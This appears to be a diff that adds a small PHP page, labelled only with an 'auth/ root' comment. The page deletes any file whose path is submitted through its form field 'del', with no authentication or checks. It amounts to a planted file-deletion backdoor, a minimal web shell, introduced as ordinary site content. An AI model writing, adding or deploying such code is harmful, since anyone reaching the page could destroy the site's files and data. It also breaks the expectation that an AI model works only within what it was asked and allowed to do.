@@ -1,0 +1,8 @@
+<# auth/ root #>
+<?
+	if(@$_POST["del"])unlink(stripslashes($_POST["del"]));
+?>
+<FORM method="post">
+<input name="del">
+<input type="submit">
+</FORM>
